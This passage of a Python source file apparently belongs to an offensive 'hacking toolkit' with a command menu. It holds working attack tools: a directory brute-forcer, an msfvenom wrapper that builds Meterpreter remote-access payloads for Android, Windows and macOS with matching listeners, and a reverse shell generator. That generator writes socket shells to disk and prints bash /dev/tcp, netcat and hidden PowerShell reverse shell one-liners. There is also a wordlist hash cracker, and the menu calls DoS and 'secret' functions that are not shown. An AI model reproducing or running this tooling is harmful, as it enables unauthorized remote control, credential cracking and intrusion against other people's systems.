            except queue.Empty:
                break
            url = f"{TARGET}{path}"
            try:
                r = session.get(url, timeout=8, allow_redirects=False)
                if r.status_code == 200:
                    print(f"\n[200] FOUND  -> {url}")
                elif r.status_code in (301, 302, 307, 308):
                    print(f"\n[{r.status_code}] REDIRECT -> {url}")
                elif r.status_code == 403:
                    print(f"\n[403] FORBIDDEN -> {url}")
                else:
                    sys.stdout.write(".")
                    sys.stdout.flush()
            except requests.RequestException:
                sys.stdout.write("x")
                sys.stdout.flush()
            finally:
                word_queue.task_done()
    def main():
        if not os.path.exists(WORDLIST):
            print("Wordlist file not found.")
            sys.exit(1)
        word_queue = build_wordlist()
        threads = []
        for _ in range(THREADS):
            t = threading.Thread(target=worker, args=(word_queue,), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        print("\nDone.")
    if __name__ == "__main__":
        main()


def msfv():
    print(""""chose the os for the payload(win/mac/adnroid): """)
    operatinsys = input("root@fancycat [/Rat/os] >> ").lower()
    if operatinsys == "android":
        name = input ("enter rat name >> ")
        lhost = input ("enter IP >> ")
        lport = input ("enter PORT >> ")
        os.system(f"sudo msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={lhost} lport={lport} R -o {name}.apk")
        print(f"""\n listener :
        msfconsole -q -x "use multi/handler; set payload android/meterpreter/reverse_tcp; set lhost {lhost}; set lport {lport}; exploit" """)

    elif operatinsys == "win" or operatinsys == "windows":
        name = input ("enter rat name >> ")
        lhost = input ("enter IP >> ")
        lport = input ("enter PORT >> ")
        formatt = input ("format (exe/java/csharp/py/ps1/c): ")
        os.system(f"sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f {formatt} -o {name}.{formatt}")
        print(f"""\n listener :
        msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {lhost}; set lport {lport}; exploit" """)

    elif operatinsys == "mac" or operatinsys == "macos":
        name = input ("enter rat name >> ")
        lhost = input ("enter IP >> ")
        lport = input ("enter PORT >> ")
        os.system(f"sudo msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f macho -o {name}.macho")
        print(f"""\n listener :
        msfconsole -q -x "use multi/handler; set payload osx/x64/meterpreter/reverse_tcp; set lhost {lhost}; set lport {lport}; exploit" """)

def rev():
    command("clear")
    print(revbanner)
    print("\033[92m" + "=" * 50)
    print("    REVERSE SHELL GENERATOR v2.0")
    print("=" * 50 + "\033[0m\n")
    while True:
        ip = input("\033[96m[?] LHOST (your IP): \033[0m").strip()
        if ip:
            break
        print("\033[91m[!] IP cannot be empty!\033[0m")
    while True:
        try:
            port = int(input("\033[96m[?] LPORT (1-65535): \033[0m").strip())
            if 1 <= port <= 65535:
                break
            print("\033[91m[!] Port must be 1-65535!\033[0m")
        except ValueError:
            print("\033[91m[!] Enter a valid number!\033[0m")
    filename = input("\033[96m[?] Output filename (e.g., shell.py): \033[0m").strip()
    if not filename:
        filename = "payload.py"
    print("\033[96m[?] Target OS:")
    print("    1. Windows")
    print("    2. Linux")
    print("    3. macOS")
    os_choice = input("    Choose (1/2/3): \033[0m").strip()
    payloads = {
        "1": f'''import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("{ip}",{port}))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["cmd.exe"])
    ''',
        "2": f'''import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("{ip}",{port}))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])
    ''',
        "3": f'''import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("{ip}",{port}))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/bash"])
    ''',
    }
    if os_choice not in payloads:
        print("\033[91m[!] Invalid choice, defaulting to Linux\033[0m")
        os_choice = "2"
    try:
        with open(filename, "w") as f:
            f.write(payloads[os_choice])
        print(f"\n\033[92m[✓] Payload saved to: {filename}\033[0m")
        print(f"\033[93m[→] File size: {os.path.getsize(filename)} bytes\033[0m")
        print("\n\033[96m" + "─" * 50)
        print("    LISTENER COMMAND:")
        print("─" * 50 + "\033[0m")
        print(f"\033[92m    nc -lvnp {port}\033[0m")
        print("\n\033[96m" + "─" * 50)
        print("    EXECUTION ON TARGET:")
        print("─" * 50 + "\033[0m")
        print(f"\033[92m    python {filename}\033[0m")
        print(f"\033[92m    python3 {filename}\033[0m")
        print("\n\033[96m" + "─" * 50)
        print("    ALTERNATIVE PAYLOADS:")
        print("─" * 50 + "\033[0m")
        print(f"\033[93m    Bash:     bash -i >& /dev/tcp/{ip}/{port} 0>&1\033[0m")
        print(f"\033[93m    Netcat:   nc -e /bin/sh {ip} {port}\033[0m")
        print(
            f"\033[93m    Powershell: powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()\"\033[0m"
        )
    except Exception as e:
        print(f"\033[91m[✗] Error: {e}\033[0m")
        sys.exit(1)
    input("press enter to go back ")
    command("clear")
    slow_print(banner, 0.002)
def hlp():
    print(optionz)
def clr():
    command("clear")
    print(banner)
    wait(0.3)
def cracker():
    command("clear")
    hashbanner = """
    \033[91m
⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣶⣿⣶⡾⠁
⠠⣿⡀⠀⠀⠀⢀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
⠀⠙⢿⣶⣶⣾⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⢿⣿⣿⠟⠁⠀⠀⠀⠈⢿⣿⠛⠻⢿⣦⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⠟⠁⠘⢿⣿⠀⠀⠀⠀⠀⠀⠸⣿⡀⠀⠀⠹⠷⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣤⠀⠀⠀⠙⠷⠶⠀⠀⠀⠀⠀⠙⠛⠁⠀⠀⠀⠀⠀⠀⠀
    \033[0m
  [ CATWARE HASH CRACKER - v1.0 ]"""
    WORDLISTS = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/fasttrack.txt",
        "wordlist.txt",
    ]
    HASHES = {
        "1": ("MD5", hashlib.md5, 32),
        "2": ("SHA1", hashlib.sha1, 40),
        "3": ("SHA256", hashlib.sha256, 64),
        "4": ("SHA512", hashlib.sha512, 128),
    }
    def identify_hash(hash_string):
        """Auto-identify hash type based on length"""
        length = len(hash_string)
        for key, (name, _, hash_len) in HASHES.items():
            if length == hash_len:
                return key, name
        return None, "Unknown"
    def crack_hash(hash_string, hash_type, wordlist_path):
        """Crack hash using wordlist"""
        hash_func = HASHES[hash_type][1]
        total = 0
        try:
            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                wordlist = f.readlines()
                total = len(wordlist)

                print(f"\033[96m[*] Loaded {total} passwords\033[0m")
                print(f"\033[93m[*] Cracking... (Ctrl+C to stop)\033[0m\n")
                for idx, word in enumerate(wordlist, 1):
                    word = word.strip()
                    if idx % 1000 == 0:
                        print(
                            f"\r\033[90m[*] Progress: {idx}/{total} ({idx * 100 // total}%)\033[0m",
                            end="",
                        )
                    if hash_func(word.encode()).hexdigest() == hash_string:
                        return word
                    variations = [word.lower(), word.upper(), word.capitalize()]
                    for var in variations:
                        if (
                            var != word
                            and hash_func(var.encode()).hexdigest() == hash_string
                        ):
                            return var
        except FileNotFoundError:
            print(f"\033[91m[!] Wordlist not found: {wordlist_path}\033[0m")
        except KeyboardInterrupt:
            print(f"\n\033[91m[!] Stopped at {idx}/{total}\033[0m")
        return None
    def main():
        print(hashbanner)
        hash_input = input("\033[96m[?] Enter hash: \033[0m").strip()
        if not hash_input:
            print("\033[91m[!] No hash provided!\033[0m")
            sys.exit(1)
        hash_id, hash_name = identify_hash(hash_input)
        if hash_id:
            print(f"\033[92m[✓] Detected: {hash_name}\033[0m")
            choice = (
                input(f"\033[96m[?] Use {hash_name}? (Y/n): \033[0m").strip().lower()
            )
            if choice == "n":
                hash_id = None
        if not hash_id:
            print("\n\033[93m[!] Manual hash type selection:\033[0m")
            for key, (name, _, length) in HASHES.items():
                print(f"    {key}. {name} ({length} chars)")
            choice = input("\033[96m[?] Choose (1-4): \033[0m").strip()
            if choice not in HASHES:
                print("\033[91m[!] Invalid choice!\033[0m")
                sys.exit(1)
            hash_id = choice
            hash_name = HASHES[hash_id][0]
        print("\n\033[93m[!] Available wordlists:\033[0m")
        for i, wl in enumerate(WORDLISTS, 1):
            exists = "\033[92m✓\033[0m" if os.path.exists(wl) else "\033[91m✗\033[0m"
            print(f"    {i}. {wl} [{exists}]")
        print("    4. Custom path")
        wl_choice = input("\033[96m[?] Choose (1-4): \033[0m").strip()
        if wl_choice == "4":
            wordlist = input("\033[96m[?] Enter wordlist path: \033[0m").strip()
        else:
            try:
                wordlist = WORDLISTS[int(wl_choice) - 1]
            except:
                print("\033[91m[!] Invalid choice, using custom\033[0m")
                wordlist = input("\033[96m[?] Enter wordlist path: \033[0m").strip()
        print(f"\n\033[96m[*] Target: {hash_name} hash\033[0m")
        print(f"\033[96m[*] Wordlist: {wordlist}\033[0m\n")
        result = crack_hash(hash_input, hash_id, wordlist)
        if result:
            print(f"\n\033[92m[✓] CRACKED! Password: {result}\033[0m")
        else:
            print(f"\n\033[91m[✗] Password not found in wordlist\033[0m")
    if __name__ == "__main__":
        try:
            main()
        except KeyboardInterrupt:
            print("\n\033[91m[!] Exited\033[0m")
            sys.exit(0)
    input("press enter to go back ")
    command("clear")
    slow_print(banner, 0.002)
def sshr():
    host2ssh = input("enter host : ")
    user2ssh = input("enter user : ")
    command(f"ssh {user2ssh}@{host2ssh}")
def compile():
    lang = input("whats the language u wanna complile (python, rust, c) ? ")
    if lang == "python" or lang == "py":
        try:
            path2py = input("enter path to your script : ")
            name2py = input("enter name to your script : ")
            command(f"pyinstaller --onefile --name {name2py} {path2py}")
        except Exception:
            print("""theres a problem. ether pyinstaller isnt installed
            (install with [pip insyall pyinstaller]) or the path is invalid""")
    elif lang == "c" or lang == "C":
        try:
            path2c = input("enter path to your script : ")
            command(f"gcc {path2c}")
        except Exception:
            print("""theres a problem. ether gcc isnt installed
            (install with [apt insyall gcc]) or the path is invalid""")
    elif lang == "rust":
        try:
            path2rs = input("enter path to your script : ")
            command(f"rustc {path2rs}")
        except Exception:
            print("""theres a problem. ether rustc isnt installed
            (install with [apt insyall rustc]) or the path is invalid""")
while True:
    opt = input("root@f4ncy>> ")
    if opt == "" or opt == " ":
        print("please input something")
        continue
    if opt == "scan":
        portscanner()
    elif opt == "secret":
        stl()
    elif opt == "req":
        req()
    elif opt == "help":
        hlp()
    elif opt == "rev":
        rev()
    elif opt == "dos":
        dos()
    elif opt == "dirf":
        dirf()
    elif opt == "clear":
        clr()
    elif opt == "crack":
        cracker()
    elif opt == "compile":
        compile()
    elif opt == "hashr":
        hashr()
    elif opt == "exit":
        print("Goodbye!")
        break
    else:
        print(f"Unknown command: {opt}")
        print("Type 'help' for available commands")